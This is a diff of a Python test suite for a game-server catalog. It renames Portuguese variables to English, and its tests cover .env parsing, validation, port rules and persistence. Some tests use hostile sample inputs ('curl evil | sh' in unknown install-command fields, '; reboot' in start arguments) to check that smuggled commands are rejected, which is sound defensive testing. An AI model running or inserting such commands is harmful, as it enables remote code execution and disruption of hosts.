@@ -25,8 +25,8 @@ def test_env_nao_expande_nada():
 
 
 def test_env_aspas_simples_multilinha_e_apostrofo_escapado():
-    texto = "PRE='\necho \"oi\"\necho it'\\''s ok\n'\nDEPOIS=1\n"
-    data = cat.read_env(texto)
+    text = "PRE='\necho \"oi\"\necho it'\\''s ok\n'\nDEPOIS=1\n"
+    data = cat.read_env(text)
     assert "echo it's ok" in data["PRE"]
     assert data["DEPOIS"] == "1", "a linha depois do bloco multilinha continua sendo lida"
 
@@ -43,24 +43,24 @@ def test_env_aspas_sem_fechar_e_erro():
 # --- catalogo curado (arquivos reais do repositorio) -----------------------
 
 def test_todos_os_env_do_repo_sao_lidos_sem_erro():
-    jogos, errors = cat.load_curated(RAIZ / "games")
+    games, errors = cat.load_curated(RAIZ / "games")
     assert errors == []
-    assert "palworld" in jogos
+    assert "palworld" in games
 
 
 def test_palworld_e_criavel_e_dayz_e_teamspeak_nao():
-    jogos, _ = cat.load_curated(RAIZ / "games")
-    assert jogos["palworld"].creatable
-    assert cat.Port(8211, "udp") in jogos["palworld"].ports
-    assert not jogos["dayz"].creatable
-    assert "conta Steam" in jogos["dayz"].reason
-    assert not jogos["teamspeak"].creatable
-    assert "instalador proprio" in jogos["teamspeak"].reason
+    games, _ = cat.load_curated(RAIZ / "games")
+    assert games["palworld"].creatable
+    assert cat.Port(8211, "udp") in games["palworld"].ports
+    assert not games["dayz"].creatable
+    assert "conta Steam" in games["dayz"].reason
+    assert not games["teamspeak"].creatable
+    assert "instalador proprio" in games["teamspeak"].reason
 
 
 def test_hooks_do_curado_nunca_aparecem_na_api():
-    jogos, _ = cat.load_curated(RAIZ / "games")
-    palworld = jogos["palworld"]
+    games, _ = cat.load_curated(RAIZ / "games")
+    palworld = games["palworld"]
     assert palworld.has_hooks
     as_public = json.dumps(palworld.as_public())
     assert "steamclient" not in as_public
@@ -70,24 +70,24 @@ def test_hooks_do_curado_nunca_aparecem_na_api():
 def test_arquivo_ruim_vira_erro_e_nao_derruba_o_resto(tmp_path):
     (tmp_path / "bom.env").write_text("GAME_KEY=bom\nSTEAM_APP_ID=1\nGAME_PORTS=7000/udp\n")
     (tmp_path / "ruim.env").write_text("GAME_KEY=Ruim_Chave\n")
-    jogos, errors = cat.load_curated(tmp_path)
-    assert list(jogos) == ["bom"]
+    games, errors = cat.load_curated(tmp_path)
+    assert list(games) == ["bom"]
     assert len(errors) == 1
     assert "ruim.env" in errors[0]
 
 
 # --- validacao do jogo dinamico --------------------------------------------
 
-def test_jogo_dinamico_valido(dados_de_jogo):
-    game = cat.validate_dynamic(dados_de_jogo)
+def test_jogo_dinamico_valido(game_data):
+    game = cat.validate_dynamic(game_data)
     assert game.creatable
     assert game.source == cat.SOURCE_DYNAMIC
     assert not game.has_hooks
     assert game.ports == (cat.Port(7777, "udp"), cat.Port(27016, "udp"))
 
 
-def test_ida_e_volta_pelo_formato_gravado(dados_de_jogo):
-    game = cat.validate_dynamic(dados_de_jogo)
+def test_ida_e_volta_pelo_formato_gravado(game_data):
+    game = cat.validate_dynamic(game_data)
     assert cat.validate_dynamic(game.as_stored()) == game
 
 
@@ -122,10 +122,10 @@ CASOS_INVALIDOS = [
 
 
 @pytest.mark.parametrize(("campo", "valor"), CASOS_INVALIDOS, ids=lambda v: repr(v)[:30])
-def test_campo_invalido_e_recusado(dados_de_jogo, campo, valor):
-    dados_de_jogo[campo] = valor
+def test_campo_invalido_e_recusado(game_data, campo, valor):
+    game_data[campo] = valor
     with pytest.raises(ValidationError) as error:
-        cat.validate_dynamic(dados_de_jogo)
+        cat.validate_dynamic(game_data)
     assert campo in str(error.value)
 
 
@@ -134,33 +134,33 @@ def test_campo_invalido_e_recusado(dados_de_jogo, campo, valor):
     ({"start_args": "-log"}, "{PORT}"),
     ({"start_args": "-port={PORT}"}, "{QUERY_PORT}"),
 ])
-def test_deslocavel_exige_que_o_jogo_receba_todas_as_portas(dados_de_jogo, mudancas, trecho):
+def test_deslocavel_exige_que_o_jogo_receba_todas_as_portas(game_data, mudancas, trecho):
     """Sem isso o firewall abriria uma porta que o jogo nao escuta (ou uma que ele ignora)."""
-    dados_de_jogo.update(mudancas)
+    game_data.update(mudancas)
     with pytest.raises(ValidationError, match="shiftable") as error:
-        cat.validate_dynamic(dados_de_jogo)
+        cat.validate_dynamic(game_data)
     assert trecho in str(error.value)
 
 
-def test_jogo_fixo_pode_ter_portas_extras_e_nenhum_marcador(dados_de_jogo):
-    dados_de_jogo.update(ports=["7777/udp", "27016/udp", "2303/udp"], start_args="-log", shiftable=False)
-    assert cat.validate_dynamic(dados_de_jogo).shiftable is False
+def test_jogo_fixo_pode_ter_portas_extras_e_nenhum_marcador(game_data):
+    game_data.update(ports=["7777/udp", "27016/udp", "2303/udp"], start_args="-log", shiftable=False)
+    assert cat.validate_dynamic(game_data).shiftable is False
 
 
 def test_jogo_curado_deslocavel_sem_marcador_vira_erro_do_catalogo(tmp_path):
     (tmp_path / "ruim.env").write_text(
         'GAME_KEY=ruim\nSTEAM_APP_ID=1\nGAME_PORT=7001\nGAME_PORTS="7001/udp"\nPORTS_SHIFTABLE=1\n', encoding="utf-8")
-    jogos, errors = cat.load_curated(tmp_path)
-    assert jogos == {}
+    games, errors = cat.load_curated(tmp_path)
+    assert games == {}
     assert "PORTS_SHIFTABLE" in errors[0]
     assert "{PORT}" in errors[0]
 
 
 @pytest.mark.parametrize("campo", ["pre_install_cmd", "post_install_cmd", "provision_script", "PRE_INSTALL_CMD", "x"])
-def test_campo_desconhecido_e_recusado_para_nao_entrar_comando_de_contrabando(dados_de_jogo, campo):
-    dados_de_jogo[campo] = "curl evil | sh"
+def test_campo_desconhecido_e_recusado_para_nao_entrar_comando_de_contrabando(game_data, campo):
+    game_data[campo] = "curl evil | sh"
     with pytest.raises(ValidationError, match="desconhecido"):
-        cat.validate_dynamic(dados_de_jogo)
+        cat.validate_dynamic(game_data)
 
 
 @pytest.mark.parametrize("corpo", [None, [], "texto", 7])
@@ -170,24 +170,24 @@ def test_corpo_que_nao_e_objeto_e_recusado(corpo):
 
 
 @pytest.mark.parametrize("campo", ["key", "name", "app_id", "ports", "game_port"])
-def test_campo_obrigatorio_ausente(dados_de_jogo, campo):
-    del dados_de_jogo[campo]
+def test_campo_obrigatorio_ausente(game_data, campo):
+    del game_data[campo]
     with pytest.raises(ValidationError, match="obrigatorio"):
-        cat.validate_dynamic(dados_de_jogo)
+        cat.validate_dynamic(game_data)
 
 
-def test_jogo_de_windows_exige_receita_de_windows(dados_de_jogo):
-    dados_de_jogo["platform"] = "windows"
-    dados_de_jogo["recipes"] = []
+def test_jogo_de_windows_exige_receita_de_windows(game_data):
+    game_data["platform"] = "windows"
+    game_data["recipes"] = []
     with pytest.raises(ValidationError, match="wine"):
-        cat.validate_dynamic(dados_de_jogo)
-    dados_de_jogo["recipes"] = ["wine"]
-    assert cat.validate_dynamic(dados_de_jogo).recipes == ("wine",)
+        cat.validate_dynamic(game_data)
+    game_data["recipes"] = ["wine"]
+    assert cat.validate_dynamic(game_data).recipes == ("wine",)
 
 
-def test_so_o_minimo_basta(dados_de_jogo):
-    minimo = {k: dados_de_jogo[k] for k in ("key", "name", "app_id", "ports", "game_port")}
-    game = cat.validate_dynamic(minimo)
+def test_so_o_minimo_basta(game_data):
+    minimum = {k: game_data[k] for k in ("key", "name", "app_id", "ports", "game_port")}
+    game = cat.validate_dynamic(minimum)
     assert (game.memory_mb, game.cores, game.disk_gb) == (4096, 2, 20)
     assert game.player_source == "log"
 
@@ -198,50 +198,50 @@ def test_catalogo_lista_curados_menos_o_template(catalog):
     assert [j.key for j in catalog.list_all()] == ["alfa", "beta", "conta", "delta"]
 
 
-def test_adicionar_persiste_e_sobrevive_a_recarga(catalog, dados_de_jogo, tmp_path):
-    catalog.add_dynamic(dados_de_jogo)
-    outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
-    assert outro.get("meujogo").name == "Meu Jogo"
-    assert outro.errors == []
+def test_adicionar_persiste_e_sobrevive_a_recarga(catalog, game_data, tmp_path):
+    catalog.add_dynamic(game_data)
+    other = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
+    assert other.get("meujogo").name == "Meu Jogo"
+    assert other.errors == []
 
 
-def test_adicionar_chave_de_jogo_curado_e_conflito(catalog, dados_de_jogo):
-    dados_de_jogo["key"] = "alfa"
+def test_adicionar_chave_de_jogo_curado_e_conflito(catalog, game_data):
+    game_data["key"] = "alfa"
     with pytest.raises(Conflict):
-        catalog.add_dynamic(dados_de_jogo)
+        catalog.add_dynamic(game_data)
 
 
-def test_adicionar_duas_vezes_e_conflito(catalog, dados_de_jogo):
-    catalog.add_dynamic(dados_de_jogo)
+def test_adicionar_duas_vezes_e_conflito(catalog, game_data):
+    catalog.add_dynamic(game_data)
     with pytest.raises(Conflict):
-        catalog.add_dynamic(dados_de_jogo)
+        catalog.add_dynamic(game_data)
 
 
-def test_jogo_recusado_nao_deixa_arquivo(catalog, dados_de_jogo, tmp_path):
-    dados_de_jogo["start_args"] = "; reboot"
+def test_jogo_recusado_nao_deixa_arquivo(catalog, game_data, tmp_path):
+    game_data["start_args"] = "; reboot"
     with pytest.raises(ValidationError):
-        catalog.add_dynamic(dados_de_jogo)
+        catalog.add_dynamic(game_data)
     assert list((tmp_path / "dinamico").glob("*")) == []
 
 
-def test_arquivo_adulterado_em_disco_nao_vira_jogo(catalog, dados_de_jogo, tmp_path):
-    catalog.add_dynamic(dados_de_jogo)
-    arquivo = tmp_path / "dinamico" / "meujogo.json"
-    adulterado = json.loads(arquivo.read_text())
-    adulterado["pre_install_cmd"] = "curl evil | sh"
-    arquivo.write_text(json.dumps(adulterado))
-    outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
+def test_arquivo_adulterado_em_disco_nao_vira_jogo(catalog, game_data, tmp_path):
+    catalog.add_dynamic(game_data)
+    file_path = tmp_path / "dinamico" / "meujogo.json"
+    tampered = json.loads(file_path.read_text())
+    tampered["pre_install_cmd"] = "curl evil | sh"
+    file_path.write_text(json.dumps(tampered))
+    other = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
     with pytest.raises(NotFound):
-        outro.get("meujogo")
-    assert any("meujogo.json" in e for e in outro.errors)
+        other.get("meujogo")
+    assert any("meujogo.json" in e for e in other.errors)
 
 
-def test_arquivo_com_nome_diferente_da_chave_e_ignorado(catalog, dados_de_jogo, tmp_path):
-    catalog.add_dynamic(dados_de_jogo)
+def test_arquivo_com_nome_diferente_da_chave_e_ignorado(catalog, game_data, tmp_path):
+    catalog.add_dynamic(game_data)
     (tmp_path / "dinamico" / "meujogo.json").rename(tmp_path / "dinamico" / "outro.json")
-    outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
+    other = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
     with pytest.raises(NotFound):
-        outro.get("meujogo")
+        other.get("meujogo")
 
 
 def test_jogo_desconhecido(catalog):
